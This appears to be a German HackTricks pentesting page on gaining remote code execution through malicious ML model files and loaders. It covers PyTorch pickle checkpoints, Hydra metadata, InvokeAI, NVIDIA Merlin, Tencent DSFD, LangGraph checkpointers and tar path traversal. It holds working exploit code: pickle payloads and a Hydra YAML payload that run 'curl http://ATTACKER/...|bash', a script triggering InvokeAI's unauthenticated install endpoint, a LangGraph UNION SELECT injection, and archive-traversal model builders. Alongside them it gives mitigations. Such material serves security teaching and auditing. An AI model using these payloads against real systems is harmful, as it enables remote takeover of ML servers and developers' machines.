# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine-Learning-Modelle werden üblicherweise in verschiedenen Formaten geteilt, etwa ONNX, TensorFlow, PyTorch usw. Diese Modelle können auf Entwicklerrechnern oder in Produktionssystemen geladen werden, um sie zu verwenden. Normalerweise sollten die Modelle keinen bösartigen Code enthalten, aber es gibt Fälle, in denen ein Modell dazu verwendet werden kann, beliebigen Code auf dem System auszuführen, entweder als vorgesehene Funktion oder aufgrund einer Schwachstelle in der Model-Loading-Library.

Zum Zeitpunkt der Erstellung sind dies einige Beispiele für diese Art von Schwachstellen:

| **Framework / Tool**        | **Schwachstelle (CVE, falls verfügbar)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Unsichere Deserialisierung in* `torch.load` **(CVE-2025-32434)**                                                              | Bösartiges Pickle in einem Model-Checkpoint führt zur Codeausführung (umgeht die `weights_only`-Schutzmaßnahme)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + bösartiger Model-Download führt zur Codeausführung; Java-Deserialisierungs-RCE in der Management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsichere Checkpoint-Deserialisierung über `torch.load` **(CVE-2025-23298)**                                           | Nicht vertrauenswürdiger Checkpoint löst während `load_model_trainer_states_from_checkpoint` einen Pickle-Reducer aus → Codeausführung im ML-Worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsicherer MessagePack-Extension-Hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Vom Benutzer kontrollierter `filter`-Key injiziert SQL-/JSON-Path-Syntax, `UNION SELECT` erstellt eine gefälschte Checkpoint-Zeile, anschließend importiert und ruft die `msgpack`-Deserialisierung vom Angreifer ausgewählten Python-Code auf | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsicheres YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Das Laden eines Models aus YAML verwendet `yaml.unsafe_load` (Codeausführung) <br> Das Laden eines Models mit einer **Lambda**-Layer führt beliebigen Python-Code aus          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite-Parsing)                                                                                          | Ein manipuliertes `.tflite`-Model löst einen Integer Overflow → Heap-Korruption aus (potenzielle RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Das Laden eines Models über `joblib.load` führt Pickle mit der `__reduce__`-Payload des Angreifers aus                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsicheres `np.load`) *umstritten*                                                                              | Der Standard von `numpy.load` erlaubte Pickle-Objekt-Arrays – ein bösartiges `.npy/.npz` führt zur Codeausführung                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (Directory Traversal) <br> **CVE-2024-5187** (Tar Traversal)                                                    | Der Pfad zu den externen Gewichten eines ONNX-Models kann das Verzeichnis verlassen (Lesen beliebiger Dateien) <br> Ein bösartiges ONNX-Model-Tar kann beliebige Dateien überschreiben (was zu RCE führen kann) | |
| ONNX Runtime (Designrisiko)  | *(Keine CVE)* ONNX custom ops / control flow                                                                                    | Ein Model mit einem custom operator erfordert das Laden von nativem Code des Angreifers; komplexe Model-Graphen missbrauchen die Logik, um unbeabsichtigte Berechnungen auszuführen   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (Path Traversal)                                                                                          | Die Verwendung der Model-Load-API mit aktiviertem `--model-control` ermöglicht einen relativen Path Traversal zum Schreiben von Dateien (z. B. Überschreiben von `.bashrc` für RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (mehrere Heap Overflows)                                                                         | Eine manipulierte GGUF-Modelldatei verursacht Heap-Buffer-Overflows im Parser und ermöglicht dadurch die Ausführung beliebigen Codes auf dem System des Opfers                     | |
| **Keras (ältere Formate)**   | *(Keine neue CVE)* Legacy-Keras-H5-Model                                                                                         | Ein bösartiges HDF5-(`.h5`-)Model mit einer Lambda-Layer führt beim Laden weiterhin Code aus (`safe_mode` von Keras deckt das alte Format nicht ab – „Downgrade-Angriff“) | |
| **Others** (allgemein)        | *Designfehler* – Pickle-Serialisierung                                                                                         | Viele ML-Tools (z. B. Pickle-basierte Model-Formate, Python `pickle.load`) führen beliebigen, in Modelldateien eingebetteten Code aus, sofern dies nicht mitigiert wird | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Nicht vertrauenswürdige Metadaten, die an `hydra.utils.instantiate()` übergeben werden **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Vom Angreifer kontrollierte Model-Metadaten/Konfiguration setzen `_target_` auf einen beliebigen Callable (z. B. `builtins.exec`) → wird während des Ladens ausgeführt, selbst bei „sicheren“ Formaten (`.safetensors`, `.nemo`, `config.json` des Repositories) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Darüber hinaus gibt es einige auf Python-Pickle basierende Modelle, etwa die von [PyTorch](https://github.com/pytorch/pytorch/security) verwendeten, die dazu genutzt werden können, beliebigen Code auf dem System auszuführen, wenn sie nicht mit `weights_only=True` geladen werden. Daher könnte jedes auf Pickle basierende Model besonders anfällig für diese Art von Angriffen sein, selbst wenn es nicht in der obigen Tabelle aufgeführt ist.

### Hydra metadata → RCE (funktioniert auch mit safetensors)

`hydra.utils.instantiate()` importiert und ruft jedes mit Punkten versehene `_target_` in einem Konfigurations-/Metadatenobjekt auf. Wenn Libraries **nicht vertrauenswürdige Model-Metadaten** an `instantiate()` übergeben, kann ein Angreifer einen Callable und Argumente angeben, die unmittelbar während des Model-Loadings ausgeführt werden (kein Pickle erforderlich).<sup>[[12]](#references)</sup>

Payload-Beispiel (funktioniert in `model_config.yaml` von `.nemo`, im Repository-`config.json` oder in `__metadata__` innerhalb von `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Wichtige Punkte:
- Wird vor der Modellinitialisierung in NeMo `restore_from/from_pretrained`, uni2TS HuggingFace-Codern und FlexTok-Loadern ausgelöst.
- Hydras String-Blocklist lässt sich über alternative Importpfade umgehen (z. B. `enum.bltns.eval`) oder durch von der Anwendung aufgelöste Namen (z. B. `nemo.core.classes.common.os.system` → `posix`).
- FlexTok analysiert außerdem stringifizierte Metadaten mit `ast.literal_eval`, wodurch vor dem Hydra-Aufruf ein DoS (massive CPU-/Speicherbelastung) möglich ist.

### 🆕  InvokeAI RCE über `torch.load` (CVE-2024-12029)

`InvokeAI` ist eine beliebte Open-Source-Weboberfläche für Stable-Diffusion. Die Versionen **5.3.1 – 5.4.2** stellen den REST-Endpunkt `/api/v2/models/install` bereit, über den Benutzer Modelle von beliebigen URLs herunterladen und laden können.<sup>[[1]](#references)</sup>

Intern ruft der Endpunkt schließlich Folgendes auf:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Wenn die bereitgestellte Datei ein **PyTorch checkpoint (`*.ckpt`)** ist, führt `torch.load` eine **pickle deserialization** durch. Da der Inhalt direkt von der vom Benutzer kontrollierten URL stammt, kann ein Angreifer ein schädliches Objekt mit einer benutzerdefinierten `__reduce__`-Methode in den checkpoint einbetten; die Methode wird **während der Deserialisierung** ausgeführt, was zu **remote code execution (RCE)** auf dem InvokeAI-Server führt.

Die Schwachstelle wurde als **CVE-2024-12029** eingestuft (CVSS 9.8, EPSS 61.17 %).

#### Exploitation-Walk-through

1. Einen schädlichen checkpoint erstellen:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hosten Sie `payload.ckpt` auf einem von Ihnen kontrollierten HTTP-Server (z. B. `http://ATTACKER/payload.ckpt`).
3. Lösen Sie den verwundbaren Endpunkt aus (keine Authentifizierung erforderlich):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Wenn InvokeAI die Datei herunterlädt, ruft es `torch.load()` auf → das `os.system`-Gadget wird ausgeführt und der Angreifer erhält Codeausführung im Kontext des InvokeAI-Prozesses.

Fertiger Exploit: Das **Metasploit**-Modul `exploit/linux/http/invokeai_rce_cve_2024_12029` automatisiert den gesamten Ablauf.<sup>[[3]](#references)</sup>

#### Bedingungen

•  InvokeAI 5.3.1-5.4.2 (scan flag standardmäßig **false**)
•  `/api/v2/models/install` ist für den Angreifer erreichbar
•  Der Prozess verfügt über Berechtigungen zum Ausführen von Shell-Befehlen

#### Gegenmaßnahmen

* Auf **InvokeAI ≥ 5.4.3** aktualisieren – der Patch setzt `scan=True` als Standard und führt vor der Deserialisierung einen Malware-Scan durch.
* Beim programmgesteuerten Laden von Checkpoints `torch.load(file, weights_only=True)` oder den neuen [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security)-Helper verwenden.
* Allow-lists / Signaturen für Modelquellen erzwingen und den Dienst mit den geringstmöglichen Berechtigungen ausführen.

> ⚠️ Denke daran, dass jedes auf Python-Pickle basierende Format (einschließlich vieler `.pt`-, `.pkl`-, `.ckpt`- und `.pth`-Dateien) grundsätzlich unsicher ist, wenn es aus nicht vertrauenswürdigen Quellen deserialisiert wird.

---

Beispiel für eine Ad-hoc-Gegenmaßnahme, falls ältere InvokeAI-Versionen weiterhin hinter einem reverse proxy betrieben werden müssen:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsicheres `torch.load` (CVE-2025-23298)

NVIDIA’s Transformers4Rec (Teil von Merlin) stellte einen unsicheren Checkpoint-Loader bereit, der `torch.load()` direkt auf vom Benutzer bereitgestellten Pfaden aufrief. Da `torch.load` auf Python-`pickle` basiert, kann ein von einem Angreifer kontrollierter Checkpoint während der Deserialisierung über einen Reducer beliebigen Code ausführen.<sup>[[5]](#references)</sup>

Verwundbarer Pfad (vor dem Fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Warum dies zu RCE führt: In Python-`pickle` kann ein Objekt einen Reducer (`__reduce__`/`__setstate__`) definieren, der eine aufrufbare Funktion und Argumente zurückgibt. Die aufrufbare Funktion wird während des Unpicklings ausgeführt. Wenn ein solches Objekt in einem Checkpoint vorhanden ist, wird es ausgeführt, bevor irgendwelche Gewichte verwendet werden.

Minimales Beispiel für einen bösartigen Checkpoint:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery-Vektoren und Auswirkungsbereich:
- Trojanisierte Checkpoints/Modelle, die über Repositories, Buckets oder Artifact-Registries geteilt werden
- Automatisierte Resume-/Deploy-Pipelines, die Checkpoints automatisch laden
- Die Ausführung erfolgt innerhalb von Training-/Inference-Workern, oft mit erhöhten Berechtigungen (z. B. als root in Containern)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ersetzte `torch.load()` direkt durch einen eingeschränkten, Allow-List-basierten Deserializer, der in `transformers4rec/utils/serialization.py` implementiert wurde. Der neue Loader validiert Typen/Felder und verhindert, dass während des Ladens beliebige Callables aufgerufen werden.<sup>[[7]](#references)</sup>

Spezifische Defensive Guidance für PyTorch-Checkpoints:
- Untrusted Data nicht unpicklen. Bevorzugt nicht ausführbare Formate wie [Safetensors](https://huggingface.co/docs/safetensors/index) oder ONNX verwenden, sofern möglich.
- Falls PyTorch-Serialization verwendet werden muss, sicherstellen, dass `weights_only=True` verwendet wird (in neueren PyTorch-Versionen unterstützt), oder einen benutzerdefinierten Allow-List-basierten Unpickler ähnlich dem Transformers4Rec-Patch verwenden.
- Model-Provenance/Signaturen durchsetzen und die Deserialisierung sandboxes (seccomp/AppArmor; Nicht-root-User; eingeschränktes FS und kein Network-Egress).
- Auf unerwartete Child-Prozesse von ML-Services zum Zeitpunkt des Checkpoint-Ladens überwachen; Verwendung von `torch.load()`/`pickle` nachverfolgen.

POC- und Vulnerable-/Patch-Referenzen:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>
- Vulnerable Loader vor dem Patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious-Checkpoint-POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Loader nach dem Patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Beispiel – Erstellen eines malicious PyTorch-Modells

- Modell erstellen:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Modell laden:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD stellt einen `resnet`-Endpunkt bereit, der benutzerkontrollierte Daten deserialisiert. ZDI bestätigte, dass ein entfernter Angreifer ein Opfer dazu bringen kann, eine schädliche Seite/Datei zu laden, diese einen präparierten serialisierten Blob an diesen Endpunkt senden zu lassen und dadurch eine Deserialization als `root` auszulösen, was zu einer vollständigen Kompromittierung führt.

Der Exploit-Ablauf entspricht dem typischen pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Jedes Gadget, das während der Deserialisierung erreichbar ist (Konstruktoren, `__setstate__`, Framework-Callbacks usw.), kann auf dieselbe Weise weaponized werden, unabhängig davon, ob der Transport über HTTP, WebSocket oder eine in einem überwachten Verzeichnis abgelegte Datei erfolgte.



### LangGraph checkpointer SQLi → MessagePack RCE

Diese Angriffskette ist interessant, weil der Angreifer **keine schädliche Modelldatei hochladen muss**. Stattdessen stellt die Anwendung eine **Persistence API für AI-Agenten** (`get_state_history(..., filter=...)`) bereit, und Benutzereingaben erreichen den Checkpointer-Query-Builder.

#### 1. Strukturelle SQLi in Metadata-Filtern

Ein verwundbares SQLite-Muster sah folgendermaßen aus:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Der Wert wird später gebunden, aber `query_key` wird in den **JSON path string** verkettet. Daher bricht ein `'` innerhalb des dictionary key aus `'$.{query_key}'` aus und injiziert SQL. Dieselbe Erkenntnis gilt für **JSON paths, identifiers, operators, `LIMIT` und TTL fields**: Platzhalter schützen nur Werte, nicht die strukturelle Query-Syntax.

#### 2. `UNION SELECT` kann nachgelagerte Sinks ansprechen, nicht nur Daten stehlen

Die Query gibt `type` und serialisierte `checkpoint`-Bytes zurück, die später wie folgt verarbeitet werden:
```python
self.serde.loads_typed((type, checkpoint))
```
Das bedeutet, dass eine SQLi in der `WHERE`-Klausel eine **gefälschte Ergebniszeile** einschleusen kann:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Wenn späterer Code eine ausgewählte Spalte parst, deserialisiert, schreibt oder ausführt, ordne diese Spalten ihren Sinks zu. In diesem Fall verwandelt die gefälschte Zeile SQLi in eine **vom Angreifer kontrollierte Deserialisierung**.

#### 3. Unsichere MessagePack-Extension-Hooks sind gleichbedeutend mit Code-Gadgets

Der `msgpack`-Pfad von LangGraph verwendete einen benutzerdefinierten Extension-Hook, der ein verschachteltes Tupel entpackte und Folgendes ausführte:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Ein MessagePack-Erweiterungsobjekt, das etwas Äquivalentes zu `("os", "system", "id > /tmp/pwned")` kodiert, importiert `os`, löst `system` auf und führt den Befehl aus. Bei der Prüfung von AI-Frameworks sollten **benutzerdefinierte MessagePack/JSON/pickle-Reviver** auf dynamische Imports, Reflection oder den Dispatch beliebiger Callables untersucht werden.

#### 4. Praktisches Audit-Muster für Agent-Frameworks

Überprüfen Sie alle benutzerkontrollierten Eingaben, die folgende Bereiche erreichen:
- APIs zum Auflisten von State History / Memory / Replay / Checkpoints
- strukturierte Filter-Builder, die SQL- oder Redis-Query-Fragmente erzeugen
- benutzerdefinierte Deserialisierer (`pickle`, `msgpack`, `json` Object Hooks, YAML-Konstruktoren)
- Recovery-Pfade, die den aus der Persistence Layer zurückgegebenen Rows vertrauen

Diese spezifische Kette betraf selbst gehostete LangGraph-Deployments mit **SQLite**- oder **Redis**-Checkpointern, wenn nicht vertrauenswürdige Benutzer `filter` kontrollieren konnten. Die in der Offenlegung genannten gepatchten Versionen waren `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` und `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

## Models zu Path Traversal

Wie in [**diesem Blogbeitrag**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) angemerkt, basieren die von verschiedenen AI-Frameworks verwendeten Model-Formate meist auf Archiven, üblicherweise `.zip`. Daher ist es möglicherweise möglich, diese Formate für Path Traversal-Angriffe zu missbrauchen, wodurch beliebige Dateien auf dem System gelesen werden können, auf dem das Model geladen wird.<sup>[[16]](#references)</sup>

Mit dem folgenden Code können Sie beispielsweise ein Model erstellen, das beim Laden eine Datei im Verzeichnis `/tmp` erstellt:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Oder mit folgendem Code können Sie ein Modell erstellen, das beim Laden einen Symlink zum Verzeichnis `/tmp` erstellt:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Tiefenanalyse: Keras-.keras-Deserialisierung und Gadget-Hunting

Eine fokussierte Anleitung zu den .keras-Interna, Lambda-layer-RCE, dem Problem mit beliebigen imports in ≤ 3.8 und der Gadget-Discovery innerhalb der allowlist findest du unter:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Referenzen

- [1] [OffSec blog – "CVE-2024-12029 – Deserialisierung nicht vertrauenswürdiger Daten in InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI-Patch-Commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7-Metasploit-Moduldokumentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – Sicherheitsaspekte für torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298: Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI-Advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec-Patch-Commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Verwundbarer Loader vor dem Patch (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC für einen bösartigen Checkpoint (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader nach dem Patch (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Remote Code Execution mit modernen AI/ML-Formaten und Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra- instantiate-Dokumentation](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra-Block-list-Commit (Warnung vor RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Von SQLi zu RCE: Ausnutzung von LangGraphs Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive-Slip-Bugs in hochwertige AI/ML-Bounties umwandeln](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)

{{#include ../banners/hacktricks-training.md}}
